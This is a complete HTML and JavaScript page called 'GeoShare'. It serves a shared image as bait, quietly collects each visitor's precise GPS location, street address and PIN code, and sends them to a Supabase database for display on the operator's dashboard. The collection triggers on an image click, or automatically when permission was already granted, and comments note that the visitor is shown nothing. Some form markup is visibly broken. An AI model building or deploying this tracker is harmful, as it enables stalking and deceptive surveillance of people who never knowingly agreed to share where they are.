<!DOCTYPE html>
<html lang="en">

<head>

<meta charset="UTF-8">

<meta
    name="viewport"
    content="width=device-width, initial-scale=1.0"
>

<title>GeoShare</title>

<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>

<style>

/* =========================================================
   RESET
========================================================= */

*{
    box-sizing:border-box;
    margin:0;
    padding:0;
}

html,
body{
    width:100%;
    min-height:100%;
}

body{
    font-family:
        Inter,
        system-ui,
        -apple-system,
        BlinkMacSystemFont,
        "Segoe UI",
        sans-serif;

    background:#050711;
    color:#fff;
}


/* =========================================================
   ADMIN PAGE
========================================================= */

#adminPage{

    min-height:100vh;

    padding:
        25px
        15px
        60px;

    background:

        radial-gradient(
            circle at 10% 0%,
            rgba(99,102,241,.25),
            transparent 35%
        ),

        radial-gradient(
            circle at 90% 10%,
            rgba(139,92,246,.20),
            transparent 30%
        ),

        #050711;
}


.admin-container{

    width:min(
        1200px,
        100%
    );

    margin:auto;
}


/* =========================================================
   HEADER
========================================================= */

.header{

    position:relative;

    padding:30px;

    margin-bottom:22px;

    border-radius:26px;

    background:
        linear-gradient(
            135deg,
            rgba(20,27,55,.97),
            rgba(9,13,30,.97)
        );

    border:
        1px solid
        rgba(255,255,255,.08);

    box-shadow:
        0 20px 70px
        rgba(0,0,0,.35);

    overflow:hidden;
}


.header::before{

    content:"";

    position:absolute;

    width:260px;
    height:260px;

    right:-100px;
    top:-130px;

    background:
        radial-gradient(
            circle,
            rgba(124,58,237,.30),
            transparent 70%
        );
}


.logo-row{

    display:flex;

    align-items:center;

    gap:15px;

    position:relative;

    z-index:1;
}


.logo{

    width:60px;
    height:60px;

    display:flex;

    align-items:center;

    justify-content:center;

    border-radius:18px;

    font-size:30px;

    background:
        linear-gradient(
            135deg,
            #6366f1,
            #8b5cf6
        );

    box-shadow:
        0 10px 30px
        rgba(99,102,241,.35);
}


.header h1{

    font-size:30px;

    line-height:1.1;
}


.header p{

    margin-top:7px;

    color:#94a3b8;

    font-size:14px;
}


/* =========================================================
   CARDS
========================================================= */

.card{

    background:
        linear-gradient(
            145deg,
            rgba(17,24,48,.97),
            rgba(9,13,28,.97)
        );

    border:
        1px solid
        rgba(255,255,255,.08);

    border-radius:24px;

    padding:24px;

    margin-bottom:22px;

    box-shadow:
        0 15px 50px
        rgba(0,0,0,.25);
}


.card-title{

    display:flex;

    align-items:center;

    gap:10px;

    margin-bottom:20px;

    font-size:20px;

    font-weight:800;
}


.card-title span{

    font-size:23px;
}


/* =========================================================
   INPUT
========================================================= */

label{

    display:block;

    margin:
        17px
        0
        8px;

    color:#cbd5e1;

    font-size:13px;

    font-weight:700;
}


input[type="text"]{

    width:100%;

    padding:
        15px
        16px;

    border-radius:14px;

    border:
        1px solid
        rgba(255,255,255,.10);

    outline:none;

    background:#060a16;

    color:#fff;

    font-size:15px;
}


input[type="text"]:focus{

    border-color:#6366f1;

    box-shadow:
        0 0 0 3px
        rgba(99,102,241,.12);
}


/* =========================================================
   UPLOAD
========================================================= */

.upload-box{

    padding:
        38px
        20px;

    border:
        2px dashed
        rgba(99,102,241,.65);

    border-radius:20px;

    text-align:center;

    cursor:pointer;

    background:
        rgba(99,102,241,.045);

    transition:.2s;
}


.upload-box:hover{

    border-color:#8b5cf6;

    background:
        rgba(139,92,246,.08);
}


.upload-icon{

    width:65px;
    height:65px;

    margin:
        0
        auto
        12px;

    display:flex;

    align-items:center;

    justify-content:center;

    border-radius:18px;

    background:
        linear-gradient(
            135deg,
            #6366f1,
            #8b5cf6
        );

    font-size:31px;
}


.upload-box strong{

    display:block;

    margin-bottom:7px;

    font-size:17px;
}


.upload-box small{

    color:#94a3b8;

    font-size:12px;
}


#imageInput{

    display:none;
}


/* =========================================================
   PREVIEW
========================================================= */

.preview{

    display:none;

    width:100%;

    max-height:430px;

    margin-top:18px;

    object-fit:contain;

    border-radius:18px;

    background:#03050b;

    border:
        1px solid
        rgba(255,255,255,.08);
}


/* =========================================================
   BUTTON
========================================================= */

button{

    border:0;

    outline:0;

    cursor:pointer;

    font-family:inherit;

    color:#fff;

    font-weight:800;

    border-radius:14px;
}


.generate-btn{

    width:100%;

    margin-top:18px;

    padding:16px;

    font-size:15px;

    background:
        linear-gradient(
            135deg,
            #6366f1,
            #8b5cf6
        );

    box-shadow:
        0 12px 35px
        rgba(99,102,241,.25);
}


.generate-btn:disabled{

    opacity:.55;

    cursor:not-allowed;
}


/* =========================================================
   RESULT
========================================================= */

.result{

    display:none;

    margin-top:18px;

    padding:18px;

    border-radius:18px;

    background:#070b17;

    border:
        1px solid
        rgba(99,102,241,.20);
}


.success-title{

    color:#86efac;

    font-size:15px;

    font-weight:800;

    margin-bottom:10px;
}


.generated-link{

    padding:13px;

    border-radius:12px;

    background:#03050c;

    color:#c7d2fe;

    font-size:13px;

    line-height:1.5;

    word-break:break-all;
}


.action-row{

    display:flex;

    gap:10px;

    margin-top:11px;
}


.action-btn{

    flex:1;

    padding:13px;

    background:#1b2542;

    font-size:13px;
}


.action-btn:hover{

    background:#263354;
}


/* =========================================================
   TABLE
========================================================= */

.table-container{

    overflow:auto;

    border-radius:15px;

    border:
        1px solid
        rgba(255,255,255,.06);
}


table{

    width:100%;

    min-width:1250px;

    border-collapse:collapse;
}


thead{

    background:#080d1b;
}


th{

    padding:14px;

    text-align:left;

    white-space:nowrap;

    color:#a5b4fc;

    font-size:12px;
}


td{

    padding:13px 14px;

    border-top:
        1px solid
        rgba(255,255,255,.05);

    color:#cbd5e1;

    font-size:12px;

    vertical-align:top;
}


tbody tr:hover{

    background:
        rgba(99,102,241,.04);
}


.empty{

    padding:30px;

    text-align:center;

    color:#64748b;
}


/* =========================================================
   VISITOR PAGE
========================================================= */

#visitorPage{

    display:none;

    width:100%;

    height:100vh;

    min-height:100vh;

    overflow:hidden;

    background:#000;
}


/*
    VISITOR SEES ONLY THIS.
*/

#visitorImage{

    display:block;

    width:100%;

    height:100vh;

    object-fit:contain;

    background:#000;

    border:0;

    outline:0;

    cursor:pointer;

    user-select:none;

    -webkit-user-select:none;

    -webkit-touch-callout:none;

    -webkit-tap-highlight-color:transparent;
}


/* =========================================================
   VISITOR MODE
========================================================= */

body.visitor-mode{

    background:#000;

    overflow:hidden;
}


body.visitor-mode #adminPage{

    display:none!important;
}


body.visitor-mode #visitorPage{

    display:block!important;
}


/* =========================================================
   MOBILE
========================================================= */

@media(max-width:700px){

    #adminPage{

        padding:
            12px
            10px
            40px;
    }


    .header{

        padding:22px;

        border-radius:21px;
    }


    .header h1{

        font-size:24px;
    }


    .logo{

        width:50px;
        height:50px;

        font-size:25px;
    }


    .card{

        padding:17px;

        border-radius:20px;
    }


    .upload-box{

        padding:30px 15px;
    }


    .action-row{

        flex-direction:column;
    }

}

</style>

</head>


<body>


<!-- =======================================================
     ADMIN
======================================================= -->

<div id="adminPage">

<div class="admin-container">


    <div class="header">

        <div class="logo-row">

            <div class="logo">
                📍
            </div>

            <div>

                <h1>
                    GeoShare
                </h1>

                <p>
                    Smart image sharing dashboard
                </p>

            </div>

        </div>

    </div>


    <!-- ===================================================
         CREATE SHARE
    =================================================== -->

    <div class="card">

        <div class="card-title">

            <span>✨</span>

            Create Share Link

        </div>


        <label for="title">
            Image Title
        </label>


        <input
            id="title"
            type="text"
            maxlength="120"
            placeholder="Example: Cute Girl"
        >


        <label>
            Select Image
        </label>


        <div
            id="uploadBox"
            class="upload-box"
        >

            <div class="upload-icon">
                🖼️
            </div>

            <strong>

            </strong>

            <small>
                JPG, JPEG, PNG, WEBP or GIF · Max 10MB
            </small>

                type="file"
                accept="image/jpeg,image/png,image/webp,image/gif"

            id="preview"
            class="preview"
            alt="Preview"
        >

            id="generateButton"
            class="generate-btn"
        >
            🔗 Generate Share Link
        </button>


        <div
            id="result"
            class="result"
        >

            <div class="success-title">
                ✅ Share link created successfully
            </div>


            <div
                id="generatedLink"
                class="generated-link"
            ></div>


            <div class="action-row">

                <button
                    id="copyButton"
                    class="action-btn"
                >
                    📋 Copy Link
                </button>


                <button
                    id="openButton"
                    class="action-btn"
                >
                    ↗️ Open Link
                </button>

            </div>

        </div>

    </div>



    <!-- ===================================================
         LOCATION TABLE
    =================================================== -->

    <div class="card">

        <div class="card-title">

            <span>📊</span>

            Visitor Locations

        </div>


        <div class="table-container">

            <table>

                <thead>

                    <tr>

                        <th>Title</th>

                        <th>Latitude</th>

                        <th>Longitude</th>

                        <th>Accuracy</th>

                        <th>Address</th>

                        <th>City</th>

                        <th>State</th>

                        <th>Pincode</th>

                        <th>Country</th>

                        <th>Time</th>

                    </tr>

                </thead>


                <tbody id="locationTable">

                    <tr>

                        <td
                            colspan="10"
                            class="empty"
                        >
                            Loading...
                        </td>

                    </tr>

                </tbody>

            </table>

        </div>

    </div>


</div>

</div>



<!-- =======================================================
     VISITOR
======================================================= -->

<div id="visitorPage">

    <img
        id="visitorImage"
        alt="Shared Image"
        draggable="false"
    >

</div>



<script>

/* =========================================================
   SUPABASE CONFIG
========================================================= */

const SUPABASE_URL =
    "https://hglehcluiqgbjbtvwsbh.supabase.co";


/*
    PASTE YOUR PUBLISHABLE KEY HERE.

    Example:

    const SUPABASE_KEY =
        "sb_publishable_xxxxxxxxx";

    NEVER paste sb_secret key here.
*/

const SUPABASE_KEY =
    "sb_publishable__rcgeXfzaLjEK5eyds8qMA_QIqqApPU";


let supabaseClient = null;


/* =========================================================
   GLOBALS
========================================================= */

let selectedFile = null;

let currentShareId = null;

let generatedShareUrl = "";


/*
    Prevent multiple simultaneous location requests.
*/

let locationRequestRunning = false;


/*
    Prevent duplicate request from rapid clicks.
*/

let lastLocationRequestTime = 0;


/* =========================================================
   SUPABASE INIT
========================================================= */

function initializeSupabase(){

    if(
        !SUPABASE_KEY ||
        SUPABASE_KEY ===
        "PASTE_YOUR_PUBLISHABLE_KEY_HERE"
    ){

        console.error(
            "Supabase publishable key is missing."
        );

        return false;
    }


    supabaseClient =
        window.supabase.createClient(
            SUPABASE_URL,
            SUPABASE_KEY
        );


    return true;
}


/* =========================================================
   PAGE START
========================================================= */

document.addEventListener(
    "DOMContentLoaded",
    async function(){

        const ready =
            initializeSupabase();


        if(!ready){

            return;
        }


        const params =
            new URLSearchParams(
                window.location.search
            );


        const shareId =
            params.get("id");


        /*
            =================================================
            VISITOR
            =================================================
        */

        if(shareId){

            currentShareId =
                shareId;


            document.body
                .classList
                .add("visitor-mode");


            await loadVisitorImage();


            /*
                IMPORTANT:

                If browser permission is already
                granted for this website, we can
                request the current position without
                showing another permission popup.

                If permission is not granted,
                visitor interaction is required.
            */

            await autoLocationIfAlreadyAllowed();


            return;
        }


        /*
            =================================================
            ADMIN
            =================================================
        */

        await loadLocations();


        /*
            Automatically refresh dashboard.
        */

        setInterval(
            loadLocations,
            5000
        );

    }
);


/* =========================================================
   IMAGE SELECT
========================================================= */

document
    .getElementById("uploadBox")
    .addEventListener(
        "click",
        function(){

            document
                .getElementById("imageInput")
                .click();

        }
    );


document
    .getElementById("imageInput")
    .addEventListener(
        "change",
        function(){

            const file =
                this.files &&
                this.files[0];


            if(!file){

                selectedFile = null;

                return;
            }


            if(
                !file.type.startsWith(
                    "image/"
                )
            ){

                alert(
                    "Please select a valid image."
                );

                this.value = "";

                return;
            }


            if(
                file.size >
                10 * 1024 * 1024
            ){

                alert(
                    "Maximum image size is 10MB."
                );

                this.value = "";

                return;
            }


            selectedFile =
                file;


            const reader =
                new FileReader();


            reader.onload =
                function(event){

                    const preview =
                        document
                        .getElementById(
                            "preview"
                        );


                    preview.src =
                        event.target.result;


                    preview.style.display =
                        "block";
                };


            reader.readAsDataURL(file);

        }
    );


/* =========================================================
   GENERATE BUTTON
========================================================= */

document
    .getElementById("generateButton")
    .addEventListener(
        "click",
        createShare
    );


/* =========================================================
   CREATE SHARE
========================================================= */

async function createShare(){

    if(!supabaseClient){

        alert(
            "Supabase is not configured."
        );

        return;
    }


    const title =
        document
        .getElementById("title")
        .value
        .trim();


    if(!title){

        alert(
            "Please enter image title."
        );

        return;
    }


    if(!selectedFile){

        alert(
            "Please select an image."
        );

        return;
    }


    const button =
        document
        .getElementById(
            "generateButton"
        );


    button.disabled = true;

    button.textContent =
        "⏳ Uploading image...";


    try{

        /*
            Unique share ID.

            Every image/link gets its own ID.
        */

        const shareId =
            crypto.randomUUID();


        const extension =
            getExtension(
                selectedFile.name
            );


        const filePath =
            shareId +
            "." +
            extension;


        /* =================================================
           STORAGE
        ================================================= */

        const uploadResult =
            await supabaseClient
            .storage
            .from("images")
            .upload(
                filePath,
                selectedFile,
                {

                    cacheControl:
                        "3600",

                    contentType:
                        selectedFile.type,

                    upsert:
                        false

                }
            );


        if(uploadResult.error){

            throw uploadResult.error;
        }


        button.textContent =
            "⏳ Saving share...";


        /* =================================================
           PUBLIC URL
        ================================================= */

        const publicResult =
            supabaseClient
            .storage
            .from("images")
            .getPublicUrl(
                filePath
            );


        const imageUrl =
            publicResult
            .data
            .publicUrl;


        if(!imageUrl){

            throw new Error(
                "Could not create image URL."
            );
        }


        /* =================================================
           SHARES TABLE
        ================================================= */

        const shareResult =
            await supabaseClient
            .from("shares")
            .insert({

                id:
                    shareId,

                title:
                    title,

                image_url:
                    imageUrl

            });


        if(shareResult.error){

            throw shareResult.error;
        }


        /* =================================================
           SHARE LINK
        ================================================= */

        const slug =
            slugify(title);


        generatedShareUrl =
            window.location.origin +
            window.location.pathname +
            "?share=" +
            encodeURIComponent(
                slug
            ) +
            "&id=" +
            encodeURIComponent(
                shareId
            );


        document
            .getElementById(
                "generatedLink"
            )
            .textContent =
                generatedShareUrl;


        document
            .getElementById(
                "result"
            )
            .style.display =
                "block";


        button.textContent =
            "✅ Link Generated";


        /*
            Refresh table.
        */

        await loadLocations();

    }

    catch(error){

        console.error(
            "Create share error:",
            error
        );


        alert(
            "❌ " +
            (
                error.message ||
                "Something went wrong."
            )
        );


        button.textContent =
            "🔗 Generate Share Link";

    }

    finally{

        button.disabled =
            false;

    }

}


/* =========================================================
   LOAD VISITOR IMAGE
========================================================= */

async function loadVisitorImage(){

    if(!supabaseClient){

        return;
    }


    if(!currentShareId){

        return;
    }


    try{

        const result =
            await supabaseClient
            .from("shares")
            .select(
                "id,image_url"
            )
            .eq(
                "id",
                currentShareId
            )
            .maybeSingle();


        if(result.error){

            console.error(
                "Image query error:",
                result.error
            );

            return;
        }


        if(
            !result.data ||
            !result.data.image_url
        ){

            console.error(
                "Share image not found."
            );

            return;
        }


        /*
            ONLY IMAGE
        */

        document
            .getElementById(
                "visitorImage"
            )
            .src =
                result.data.image_url;

    }

    catch(error){

        console.error(
            "Visitor image error:",
            error
        );

    }

}


/* =========================================================
   AUTO LOCATION WHEN ALREADY GRANTED
========================================================= */

async function autoLocationIfAlreadyAllowed(){

    /*
        Permissions API may not be available
        in every browser.
    */

    if(
        !navigator.permissions
    ){

        return;
    }


    try{

        const permission =
            await navigator
            .permissions
            .query(
                {
                    name:"geolocation"
                }
            );


        /*
            Already allowed.

            No browser popup should be needed.
        */

        if(
            permission.state ===
            "granted"
        ){

            requestLocation(
                false
            );

        }


        /*
            If "prompt", do NOTHING.

            User will get native browser
            permission after image click.
        */

    }

    catch(error){

        console.log(
            "Permission state unavailable."
        );

    }

}


/* =========================================================
   IMAGE CLICK
========================================================= */

document
    .getElementById("visitorImage")
    .addEventListener(
        "click",
        function(){

            /*
                User interaction.

                This allows browser to show
                its native location permission
                dialog if required.
            */

            requestLocation(
                true
            );

        }
    );


/* =========================================================
   REQUEST LOCATION
========================================================= */

function requestLocation(
    fromUserClick
){

    if(!navigator.geolocation){

        return;
    }


    if(!supabaseClient){

        return;
    }


    if(!currentShareId){

        return;
    }


    /*
        Prevent duplicate requests.
    */

    if(locationRequestRunning){

        return;
    }


    /*
        Prevent rapid repeated clicks.
    */

    const now =
        Date.now();


    if(
        now -
        lastLocationRequestTime
        <
        3000
    ){

        return;
    }


    lastLocationRequestTime =
        now;


    locationRequestRunning =
        true;


    navigator
        .geolocation
        .getCurrentPosition(

            async function(position){

                try{

                    await saveVisitorLocation(
                        position
                    );

                }

                finally{

                    locationRequestRunning =
                        false;

                }

            },

            function(error){

                locationRequestRunning =
                    false;


                /*
                    Don't show anything to visitor.

                    Permission denied / timeout /
                    unavailable = image remains.
                */

                console.log(
                    "Location unavailable:",
                    error.code
                );

            },

            {

                enableHighAccuracy:
                    true,

                timeout:
                    20000,

                maximumAge:
                    0

            }

        );

}


/* =========================================================
   SAVE VISITOR LOCATION
========================================================= */

async function saveVisitorLocation(
    position
){

    const latitude =
        position.coords.latitude;


    const longitude =
        position.coords.longitude;


    const accuracy =
        position.coords.accuracy;


    /*
        Current exact timestamp.
    */

    const visitedAt =
        new Date()
        .toISOString();


    try{

        /*
            Reverse geocoding.
        */

        const location =
            await reverseGeocode(
                latitude,
                longitude
            );


        /*
            SAVE ONLY AFTER
            SUCCESSFUL GEOLOCATION.
        */

        const result =
            await supabaseClient
            .from(
                "visitor_locations"
            )
            .insert({

                share_id:
                    currentShareId,

                latitude:
                    latitude,

                longitude:
                    longitude,

                accuracy:
                    accuracy,

                address:
                    location.address,

                city:
                    location.city,

                state:
                    location.state,

                postcode:
                    location.postcode,

                country:
                    location.country,

                visited_at:
                    visitedAt

            });


        if(result.error){

            console.error(
                "Location save failed:",
                result.error
            );

            return false;
        }


        /*
            Visitor sees nothing.

            Dashboard will fetch it automatically.
        */

        return true;

    }

    catch(error){

        console.error(
            "Location save processing failed:",
            error
        );

        return false;

    }

}


/* =========================================================
   REVERSE GEOCODE
========================================================= */

async function reverseGeocode(
    latitude,
    longitude
){

    const url =
        "https://nominatim.openstreetmap.org/reverse" +

        "?format=jsonv2" +

        "&lat=" +
        encodeURIComponent(
            latitude
        ) +

        "&lon=" +
        encodeURIComponent(
            longitude
        ) +

        "&addressdetails=1" +

        "&zoom=18";


    const response =
        await fetch(
            url,
            {
                headers:{
                    "Accept":
                        "application/json"
                }
            }
        );


    if(!response.ok){

        throw new Error(
            "Address lookup failed."
        );
    }


    const data =
        await response.json();


    const a =
        data.address ||
        {};


    /*
        CITY
    */

    const city =
        a.city ||
        a.town ||
        a.village ||
        a.municipality ||
        a.suburb ||
        a.city_district ||
        "";


    /*
        STATE
    */

    const state =
        a.state ||
        a.state_district ||
        "";


    /*
        PINCODE
    */

    let postcode =
        a.postcode ||
        "";


    /*
        COUNTRY
    */

    const country =
        a.country ||
        "";


    /*
        FULL ADDRESS
    */

    let fullAddress =
        data.display_name ||
        [
            a.house_number,
            a.building,
            a.road,
            a.neighbourhood,
            a.suburb,
            city,
            state,
            postcode,
            country
        ]
        .filter(Boolean)
        .join(", ");


    /*
        India PIN fallback.

        If Nominatim didn't return postcode,
        try to find a 6-digit PIN in address.
    */

    if(
        !postcode &&
        country
            .toLowerCase()
            .includes("india")
    ){

        const match =
            String(fullAddress)
            .match(
                /\b[1-9][0-9]{5}\b/
            );


        if(match){

            postcode =
                match[0];

        }

    }


    return {

        address:
            fullAddress || "",

        city:
            city || "",

        state:
            state || "",

        postcode:
            postcode || "",

        country:
            country || ""

    };

}


/* =========================================================
   LOAD ALL LOCATIONS
========================================================= */

async function loadLocations(){

    if(!supabaseClient){

        return;
    }


    const table =
        document
        .getElementById(
            "locationTable"
        );


    try{

        /*
            IMPORTANT:

            NO:

            shares(title)

            This avoids PGRST200.
        */

        const locationsResult =
            await supabaseClient
            .from(
                "visitor_locations"
            )
            .select(
                `
                    id,
                    share_id,
                    latitude,
                    longitude,
                    accuracy,
                    address,
                    city,
                    state,
                    postcode,
                    country,
                    visited_at
                `
            )
            .order(
                "visited_at",
                {
                    ascending:false
                }
            );


        if(
            locationsResult.error
        ){

            throw locationsResult.error;
        }


        const locations =
            locationsResult.data ||
            [];


        if(!locations.length){

            table.innerHTML = `

                <tr>

                    <td
                        colspan="10"
                        class="empty"
                    >
                        No consented visitor locations yet.
                    </td>

                </tr>

            `;

            return;
        }


        /*
            Get unique share IDs.
        */

        const shareIds =
            [
                ...new Set(
                    locations
                    .map(
                        row =>
                            row.share_id
                    )
                    .filter(Boolean)
                )
            ];


        let shareMap = {};


        /*
            Fetch shares separately.

            No foreign key required.
        */

        if(
            shareIds.length
        ){

            const sharesResult =
                await supabaseClient
                .from("shares")
                .select(
                    "id,title"
                )
                .in(
                    "id",
                    shareIds
                );


            if(
                !sharesResult.error
            ){

                (
                    sharesResult.data ||
                    []
                )
                .forEach(
                    function(share){

                        shareMap[
                            share.id
                        ] =
                            share.title;

                    }
                );

            }

        }


        /*
            BUILD TABLE
        */

        table.innerHTML =
            locations
            .map(
                function(row){

                    const title =
                        shareMap[
                            row.share_id
                        ] ||
                        "Unknown";


                    /*
                        Convert UTC timestamp
                        to visitor/admin local time.
                    */

                    const time =
                        row.visited_at
                        ?
                        new Date(
                            row.visited_at
                        )
                        .toLocaleString(
                            undefined,
                            {
                                dateStyle:
                                    "medium",

                                timeStyle:
                                    "medium"
                            }
                        )
                        :
                        "-";


                    return `

                    <tr>

                        <td>
                            <strong>
                                ${escapeHtml(
                                    title
                                )}
                            </strong>
                        </td>


                        <td>
                            ${formatNumber(
                                row.latitude
                            )}
                        </td>


                        <td>
                            ${formatNumber(
                                row.longitude
                            )}
                        </td>


                        <td>
                            ${
                                row.accuracy !==
                                null &&
                                row.accuracy !==
                                undefined

                                ?

                                Math.round(
                                    Number(
                                        row.accuracy
                                    )
                                ) +
                                " m"

                                :

                                "-"
                            }
                        </td>


                        <td>
                            ${escapeHtml(
                                row.address ||
                                "-"
                            )}
                        </td>


                        <td>
                            ${escapeHtml(
                                row.city ||
                                "-"
                            )}
                        </td>


                        <td>
                            ${escapeHtml(
                                row.state ||
                                "-"
                            )}
                        </td>


                        <td>
                            ${escapeHtml(
                                row.postcode ||
                                "-"
                            )}
                        </td>


                        <td>
                            ${escapeHtml(
                                row.country ||
                                "-"
                            )}
                        </td>


                        <td>
                            ${escapeHtml(
                                time
                            )}
                        </td>

                    </tr>

                    `;

                }
            )
            .join("");

    }

    catch(error){

        console.error(
            "Dashboard load error:",
            error
        );


        table.innerHTML = `

            <tr>

                <td
                    colspan="10"
                    class="empty"
                >

                    ❌
                    ${escapeHtml(
                        error.message ||
                        "Could not load locations."
                    )}

                </td>

            </tr>

        `;

    }

}


/* =========================================================
   COPY LINK
========================================================= */

document
    .getElementById("copyButton")
    .addEventListener(
        "click",
        copyLink
    );


async function copyLink(){

    if(!generatedShareUrl){

        return;
    }


    try{

        await navigator
            .clipboard
            .writeText(
                generatedShareUrl
            );


        const button =
            document
            .getElementById(
                "copyButton"
            );


        button.textContent =
            "✅ Copied";


        setTimeout(
            function(){

                button.textContent =
                    "📋 Copy Link";

            },
            1800
        );

    }

    catch(error){

        const textarea =
            document.createElement(
                "textarea"
            );


        textarea.value =
            generatedShareUrl;


        document.body
            .appendChild(
                textarea
            );


        textarea.select();


        document.execCommand(
            "copy"
        );


        textarea.remove();


        alert(
            "✅ Link copied!"
        );

    }

}

/* =========================================================
   EXTENSION
========================================================= */

function getExtension(
    filename
){

    const extension =
        filename
        .split(".")
        .pop()
        .toLowerCase();


    const allowed = [

        "jpg",
        "jpeg",
        "png",
        "webp",
        "gif"

    ];


    if(
        allowed.includes(
            extension
        )
    ){

        return extension;

    }


    return "jpg";

}


/* =========================================================
   SLUG
========================================================= */

function slugify(
    text
){

    return String(text)

        .toLowerCase()

        .trim()

        .replace(
            /[^a-z0-9]+/g,
            "-"
        )

        .replace(
            /^-+|-+$/g,
            ""
        )

        .slice(
            0,
            70
        )

        ||
        "image";

}


/* =========================================================
   NUMBER FORMAT
========================================================= */

function formatNumber(
    value
){

    if(
        value === null ||
        value === undefined ||
        value === ""
    ){

        return "-";
    }


    const number =
        Number(value);


    if(
        !Number.isFinite(
            number
        )
    ){

        return "-";
    }


    return number.toFixed(6);

}


/* =========================================================
   HTML ESCAPE
========================================================= */

function escapeHtml(
    value
){

    return String(
        value ?? ""
    )

    .replaceAll(
        "&",
        "&amp;"
    )

    .replaceAll(
        "<",
        "&lt;"
    )

    .replaceAll(
        ">",
        "&gt;"
    )

    .replaceAll(
        '"',
        "&quot;"
    )

    .replaceAll(
        "'",
        "&#039;"
    );

}
